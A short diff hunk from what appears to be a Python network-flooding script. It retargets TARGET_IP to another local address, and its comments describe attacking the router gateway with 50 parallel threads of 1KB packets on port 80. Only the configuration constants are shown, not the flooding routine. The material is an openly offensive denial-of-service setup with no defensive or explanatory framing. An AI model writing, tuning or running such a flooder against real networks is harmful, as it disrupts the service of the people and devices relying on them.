@@ -6,7 +6,7 @@ import sys
 import threading
 
 # ==================== CONFIGURATION ====================
-TARGET_IP = "192.168.100.1"  # Attack the ROUTER (Gateway) to force WiFi traffic
+TARGET_IP = "192.168.100.34"  # Attack the ROUTER (Gateway) to force WiFi traffic
 TARGET_PORT = 80           # HTTP Port
 PACKET_SIZE = 1024         # 1KB per packet
 THREADS = 50               # Number of threads (Parallel canons)
